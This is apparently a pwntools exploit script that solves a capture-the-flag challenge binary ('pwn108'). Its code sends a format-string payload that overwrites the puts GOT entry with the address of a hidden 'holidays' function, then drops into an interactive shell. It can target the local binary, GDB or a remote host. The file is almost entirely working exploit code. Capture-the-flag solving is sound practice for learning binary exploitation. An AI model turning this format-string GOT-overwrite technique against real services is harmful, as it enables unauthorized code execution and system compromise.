from pwn import *
from pwnlib.fmtstr import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './pwn108.pwn108'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

offset = 10
shell = elf.functions['holidays']

info('Format string offset %#x', offset)
info('Address to overwrite (elf.got.puts): %#x', elf.got.puts)
info('Address to write func() shell: %#x', 0x000000000040123b)

# Send payload
io.recvuntil(b'=[Your name]:')
io.sendline(b'Pwner')
io.recvuntil(b'=[Your Reg No]:')
payload = fmtstr_payload(offset, {elf.got.puts: shell})
io.sendline(payload)

io.interactive()